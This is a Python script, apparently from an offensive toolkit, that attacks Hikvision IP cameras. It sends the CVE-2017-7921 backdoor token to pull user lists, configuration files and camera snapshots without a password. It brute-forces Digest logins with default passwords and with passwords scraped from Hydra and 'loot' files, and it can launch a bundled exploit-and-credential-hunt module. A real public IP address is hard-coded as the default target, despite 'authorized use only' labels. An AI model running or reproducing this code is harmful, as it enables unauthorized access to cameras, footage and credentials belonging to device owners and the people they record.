#!/usr/bin/env python3
"""
Test Hikvision credential discovery on a single target.

Usage (authorized targets only):
  python test_hikvision_target.py
  python test_hikvision_target.py -H 188.225.141.254
  python test_hikvision_target.py -H 188.225.141.254 -p YOUR_PASSWORD

Compares:
  - CVE-2017-7921 backdoor (admin:11 bypass — NOT real password)
  - HTTP Digest on ISAPI only (not login.asp — avoids false positives)
"""

from __future__ import annotations

import argparse
import base64
import sys

try:
    import bootstrap  # noqa: F401 — when run as tests/test_hikvision_target.py
except ModuleNotFoundError:
    from tests import bootstrap  # noqa: F401 — when imported from GUI package
import requests
import urllib3
from requests.auth import HTTPDigestAuth

urllib3.disable_warnings()

DEFAULT_HOST = "188.225.141.254"
BACKDOOR_B64 = "YWRtaW46MTEK"  # admin:11

# Generic Hikvision guesses only — NOT discovered from the target automatically.
DEFAULT_DIGEST_PASSWORDS = (
    "12345",
    "123456",
    "12345678",
    "admin",
    "hikvision",
    "1234567890",
)

# ISAPI paths only — login.asp always returns 200 + "login" and causes false [+] results.
DIGEST_CHECK_PATHS = (
    "/ISAPI/Security/userCheck",
    "/ISAPI/System/deviceInfo",
    "/PSIA/Custom/SelfExt/userCheck",
)


def _session() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = "Mozilla/5.0 Hikvision-Test/1.0"
    s.timeout = 12
    return s


def decode_backdoor() -> str:
    raw = base64.b64decode(BACKDOOR_B64).decode("utf-8", errors="ignore").strip()
    return raw.replace("\n", "")


def _base_url(host: str, port: int) -> str:
    if port in (443, 8443):
        return f"https://{host}" if port == 443 else f"https://{host}:{port}"
    if port == 80:
        return f"http://{host}"
    return f"http://{host}:{port}"


def _ports_for_host(host: str) -> list[int]:
    import os

    from core.paths import project_root
    from core.workspace_ports import load_open_ports_from_workspace, prefer_hikvision_http_ports

    td = os.environ.get("ENGINE_WORKSPACE") or os.path.join(project_root(), "targets", host)
    cached = load_open_ports_from_workspace(td)
    if cached:
        return prefer_hikvision_http_ports(cached)
    return [8000, 80]


def test_backdoor(host: str, port: int = 80) -> dict:
    """Backdoor bypass — snapshot/config without real password."""
    from engines.hikvision_workflow import backdoor_endpoint_ok

    base = _base_url(host, port)
    auth_q = f"?auth={BACKDOOR_B64}"
    session = _session()
    results = {}

    endpoints = {
        "users": f"{base}/Security/users{auth_q}",
        "config": f"{base}/System/configurationFile{auth_q}",
        "snapshot": f"{base}/onvif-http/snapshot{auth_q}",
        "login_page": f"{base}/doc/page/login.asp",
    }

    for name, url in endpoints.items():
        try:
            r = session.get(url, timeout=12)
            results[name] = {
                "url": url,
                "status": r.status_code,
                "size": len(r.content),
                "ok": backdoor_endpoint_ok(name, r.status_code, r.content),
            }
        except requests.RequestException as exc:
            results[name] = {"url": url, "status": "error", "error": str(exc), "ok": False}

    return results


def test_digest_login(host: str, username: str, password: str, port: int = 80) -> dict:
    """Digest auth valid only when ISAPI returns real XML (not HTML login shell)."""
    from engines.hikvision_snapshots import is_isapi_xml

    base = _base_url(host, port)
    session = _session()
    digest = HTTPDigestAuth(username, password)
    hits = []

    for path in DIGEST_CHECK_PATHS:
        url = f"{base}{path}"
        try:
            r = session.get(url, auth=digest, timeout=12)
            ok = r.status_code == 200 and is_isapi_xml(r.content)
            hits.append({
                "path": path,
                "status": r.status_code,
                "ok": ok,
                "snippet": r.text[:120].replace("\n", " "),
            })
        except requests.RequestException as exc:
            hits.append({"path": path, "status": "error", "error": str(exc), "ok": False})

    any_ok = any(h.get("ok") for h in hits)
    return {"username": username, "password": password, "valid": any_ok, "checks": hits}


def _passwords_from_workspace(host: str) -> list[str]:
    """Passwords saved by Hydra/engine in targets/<host>/ — not hardcoded guesses."""
    import os
    import re

    from core.paths import project_root

    td = os.environ.get("ENGINE_WORKSPACE") or os.path.join(project_root(), "targets", host)
    found: list[str] = []
    for name in ("hydra_success.txt", "hydra_web_success.txt", "credentials.txt", "loot_summary.txt"):
        path = os.path.join(td, name)
        if not os.path.isfile(path):
            continue
        try:
            text = open(path, encoding="utf-8", errors="replace").read(4000)
        except OSError:
            continue
        for m in re.finditer(r"(?:password|pass|login)[:\s]+(\S+)", text, re.I):
            found.append(m.group(1).strip("'\""))
        for m in re.finditer(r"\b(admin|root|guest):(\S+)", text, re.I):
            found.append(m.group(2))
    out: list[str] = []
    for p in found:
        if p and p not in out and p != "11":
            out.append(p)
    return out


def _digest_password_candidates(host: str, user_password: str = "") -> tuple[list[str], str]:
    """Returns (passwords, source_note)."""
    ws = _passwords_from_workspace(host)
    if user_password:
        return [user_password] + [p for p in ws if p != user_password], "CLI -p + workspace"
    if ws:
        return ws + [p for p in DEFAULT_DIGEST_PASSWORDS if p not in ws], "workspace artifacts + generic list"
    return list(DEFAULT_DIGEST_PASSWORDS), "generic Hikvision wordlist only (use -p for your password)"


def test_basic_login(host: str, username: str, password: str, port: int = 80) -> dict:
    """Basic auth (usually fails on Hikvision — included to show the difference)."""
    from engines.hikvision_snapshots import is_isapi_xml

    base = _base_url(host, port)
    session = _session()
    try:
        r = session.get(f"{base}/ISAPI/Security/userCheck", auth=(username, password), timeout=12)
        real = r.status_code == 200 and is_isapi_xml(r.content)
        note = ""
        if r.status_code == 200 and not real:
            note = "HTTP 200 but HTML shell — NOT valid ISAPI (misleading on port 80)"
        return {
            "valid": real,
            "status": r.status_code,
            "method": "HTTP Basic",
            "note": note,
        }
    except requests.RequestException as exc:
        return {"valid": False, "error": str(exc), "method": "HTTP Basic"}


def run_full_hunt(host: str) -> None:
    from engines.credential_hunter import hunt_hikvision_credentials
    from engines.device_cve_checker import assess_hikvision, print_cve_report
    from engines.hikvision_module import HikvisionExploiter

    print("\n[4] Running integrated exploit + credential hunt (main.py logic)...")
    url = f"http://{host}"
    hexp = HikvisionExploiter(url)
    users, passwords = hexp.run_backdoor()
    entry = hunt_hikvision_credentials(host, users, passwords, port=80)
    if entry:
        print(f"    [+] HUNT RESULT: {entry.username}:{entry.password} ({entry.auth_method})")
    else:
        print("    [!] Hunt did not confirm a real Digest password.")


def main() -> int:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")

    p = argparse.ArgumentParser(description="Hikvision credential test (authorized use only)")
    p.add_argument("-H", "--host", default=DEFAULT_HOST)
    p.add_argument("-p", "--password", default="", help="Password YOU supply to test (not guessed from target)")
    p.add_argument("--full", action="store_true", help="Run full exploit + hunt from main.py modules")
    args = p.parse_args()
    host = args.host.strip()
    http_ports = _ports_for_host(host)
    primary_port = http_ports[0]
    if len(http_ports) > 1:
        print(f"[*] Nmap workspace ports: {http_ports} — Hikvision HTTP priority: {primary_port} first")
        if 80 in http_ports and primary_port != 80:
            print("    (port 80 may be ZyXEL/router front — ISAPI often on 8000)")

    print("=" * 70)
    print(f"  HIKVISION CREDENTIAL TEST — {host}")
    print(f"  Login page: {_base_url(host, primary_port)}/doc/page/login.asp")
    print("=" * 70)

    print("\n[1] CVE-2017-7921 BACKDOOR (bypass — NOT the real web password)")
    print(f"    Decoded bypass token: {decode_backdoor()}")
    backdoor = test_backdoor(host, primary_port)
    for name, info in backdoor.items():
        status = info.get("status", "?")
        ok = info.get("ok", False)
        mark = "[+]" if ok else "[-]"
        extra = f" ({info['size']} bytes)" if "size" in info else ""
        print(f"    {mark} {name:12} HTTP {status}{extra}")

    print("\n[2] HTTP BASIC auth (admin + test passwords) — expect FAIL on Hikvision")
    for pw in ("11", "12345"):
        basic = test_basic_login(host, "admin", pw, primary_port)
        mark = "[+]" if basic.get("valid") else "[-]"
        print(f"    {mark} admin:{pw} -> {basic}")

    print("\n[3] HTTP DIGEST auth (ISAPI XML required — NOT login.asp)")
    candidates, pw_source = _digest_password_candidates(host, args.password.strip())
    print(f"    [*] Password list source: {pw_source}")
    if not args.password:
        print(
            "    [*] No -p given: testing common defaults only. "
            "The tool does NOT read your router password from the target unless Hydra saved it."
        )
    seen: set[str] = set()
    found_real = None
    digest_port = primary_port
    for pw in candidates:
        if pw in seen:
            continue
        seen.add(pw)
        for port in http_ports:
            result = test_digest_login(host, "admin", pw, port)
            mark = "[+]" if result["valid"] else "[-]"
            print(f"    {mark} admin:{pw} @ port {port} -> valid={result['valid']}")
            for check in result["checks"]:
                if check.get("ok"):
                    print(f"         OK on {check['path']} (HTTP {check['status']})")
            if result["valid"] and pw != "11":
                found_real = pw
                digest_port = port
                primary_port = port
                break
        if found_real:
            break

    from engines.hikvision_workflow import HikvisionRunContext, probe_backdoor_live, run_post_test_workflow

    backdoor_ok = any(v.get("ok") for v in backdoor.values()) or probe_backdoor_live(host, primary_port)

    ctx = HikvisionRunContext(
        host=host,
        http_port=digest_port if found_real else primary_port,
        http_ports=http_ports,
        backdoor_confirmed=backdoor_ok,
        digest_valid=bool(found_real),
        digest_password=found_real,
    )
    run_post_test_workflow(ctx)

    print("\n" + "=" * 70)
    print("  CONCLUSION")
    print("=" * 70)
    if backdoor.get("snapshot", {}).get("ok"):
        print("  Backdoor snapshot: WORKS without real password (admin:11 bypass)")
    elif backdoor_ok:
        print("  Backdoor (users/config): likely WORKS — see snapshots/ and hikvision_test_report.json")
    if found_real:
        print(f"  REAL PASSWORD    : admin:{found_real}")
        print("  Use this for login.asp / ISAPI / RTSP — NOT admin:11")
    else:
        print("  Real ISAPI password NOT confirmed (Digest did not return device XML).")
        print("  Use: python test_hikvision_target.py -H IP -p YOUR_PASSWORD")
        print(f"  Login page (manual check): {_base_url(host, primary_port)}/doc/page/login.asp")
    print("=" * 70)

    if args.full:
        run_full_hunt(host)

    return 0 if found_real or backdoor_ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
